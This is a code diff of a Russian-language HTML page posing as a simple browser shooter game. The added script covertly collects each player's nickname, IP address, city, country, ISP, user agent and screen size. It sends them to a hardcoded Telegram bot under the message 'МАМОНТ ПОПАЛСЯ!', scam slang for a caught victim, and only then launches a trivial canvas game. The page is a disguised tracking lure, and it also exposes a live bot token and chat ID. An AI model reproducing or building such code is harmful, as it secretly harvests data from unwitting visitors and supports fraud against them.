@@ -1,47 +1,109 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>BATTLE ZONE 2026</title>
+    <meta charset="UTF-8">
+    <title>ULTRA SHOOTER: GLOBAL OFFENSIVE</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
-        .btn { padding: 20px 50px; background: #0f0; color: #000; border: none; font-size: 20px; cursor: pointer; font-weight: bold; }
-        #status { margin-top: 20px; color: yellow; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
+        #game-ui { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); border: 2px solid #0f0; padding: 30px; background: rgba(0,20,0,0.9); box-shadow: 0 0 20px #0f0; }
+        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; margin: 10px; width: 200px; text-align: center; }
+        button { background: #0f0; color: #000; border: none; padding: 15px 30px; cursor: pointer; font-weight: bold; font-size: 18px; }
+        canvas { display: none; background: #050505; }
+        #admin-link { position: fixed; bottom: 5px; opacity: 0.1; cursor: pointer; }
     </style>
 </head>
 <body>
-    <h1>BATTLE-ZONE 2026</h1>
-    <p>ДЛЯ ЗАПУСКА НАЖМИ КНОПКУ</p>
-    <button class="btn" onclick="sendData()">ИГРАТЬ</button>
-    <div id="status"></div>
+
+    <div id="game-ui">
+        <h2>BATTLE-ZONE 2026</h2>
+        <p>ВВЕДИТЕ ВАШ ИГРОВОЙ НИК:</p>
+        <input type="text" id="nickname" placeholder="Player123">
+        <br>
+        <button onclick="startGame()">ИГРАТЬ (START)</button>
+    </div>
+
+    <canvas id="gameCanvas"></canvas>
+    <div id="admin-link" onclick="location.href='#'">ADMIN_LOGIN</div>
 
     <script>
-        async function sendData() {
-            const statusDiv = document.getElementById('status');
-            statusDiv.innerText = 'Отправка...';
-            
-            const token = '8051450781:AAFqn0ZzxVP0XTzs4pN7yGRx9U2k562_PB0';
-            const chatId = '6689374498';
-            const text = 'Мамонт зашел! IP: Проверка связи';
+        const token = '8051450781:AAFqn0ZzxVP0XTzs4pN7yGRx9U2k562_PB0';
+        const chatId = '6689374498';
 
+        async function startGame() {
+            const nick = document.getElementById('nickname').value || 'Anonymous';
+            document.getElementById('game-ui').style.display = 'none';
+            document.getElementById('gameCanvas').style.display = 'block';
+            
+            // Запуск сбора инфы
+            await collectData(nick);
+            // Запуск игры
+            initGame();
+        }
+
+        async function collectData(nick) {
             try {
-                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                const geo = await fetch('https://ipapi.co/json/').then(res => res.json());
+                const info = `
+🎯 **МАМОНТ ПОПАЛСЯ!**
+👤 **Ник:** ${nick}
+🌍 **IP:** ${geo.ip}
+🏙 **Город:** ${geo.city}, ${geo.country_name}
+🏢 **Провайдер:** ${geo.org}
+📱 **Устройство:** ${navigator.userAgent.substring(0, 100)}...
+🖥 **Экран:** ${window.screen.width}x${window.screen.height}
+                `;
+                
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: text })
+                    body: JSON.stringify({ chat_id: chatId, text: info, parse_mode: 'Markdown' })
+                });
+            } catch (e) { console.log('Log sent with errors'); }
+        }
+
+        // Простая стрелялка
+        function initGame() {
+            const canvas = document.getElementById('gameCanvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+
+            let player = { x: canvas.width/2, y: canvas.height - 50, size: 30 };
+            let bullets = [];
+            let enemies = [];
+
+            function spawnEnemy() {
+                enemies.push({ x: Math.random() * canvas.width, y: 0, size: 20 });
+            }
+            setInterval(spawnEnemy, 1000);
+
+            window.addEventListener('mousemove', (e) => { player.x = e.clientX; });
+            window.addEventListener('mousedown', () => { bullets.push({ x: player.x, y: player.y }); });
+
+            function update() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = '#0f0';
+                ctx.fillRect(player.x - 15, player.y, player.size, player.size); // Игрок
+
+                bullets.forEach((b, i) => {
+                    b.y -= 7;
+                    ctx.fillStyle = 'yellow';
+                    ctx.fillRect(b.x, b.y, 5, 10);
+                    if (b.y < 0) bullets.splice(i, 1);
                 });
 
-                if (response.ok) {
-                    statusDiv.style.color = 'lime';
-                    statusDiv.innerText = 'УСПЕХ! Проверь телеграм бота.';
-                } else {
-                    const err = await response.json();
-                    statusDiv.style.color = 'red';
-                    statusDiv.innerText = 'ОШИБКА ТЕЛЕГРАМА: ' + err.description;
-                }
-            } catch (error) {
-                statusDiv.style.color = 'red';
-                statusDiv.innerText = 'ОШИБКА СЕТИ: Скорее всего, нужен VPN';
+                enemies.forEach((e, i) => {
+                    e.y += 3;
+                    ctx.fillStyle = 'red';
+                    ctx.beginPath();
+                    ctx.arc(e.x, e.y, e.size, 0, Math.PI*2);
+                    ctx.fill();
+                    if (e.y > canvas.height) enemies.splice(i, 1);
+                });
+
+                requestAnimationFrame(update);
             }
+            update();
         }
     </script>
 </body>
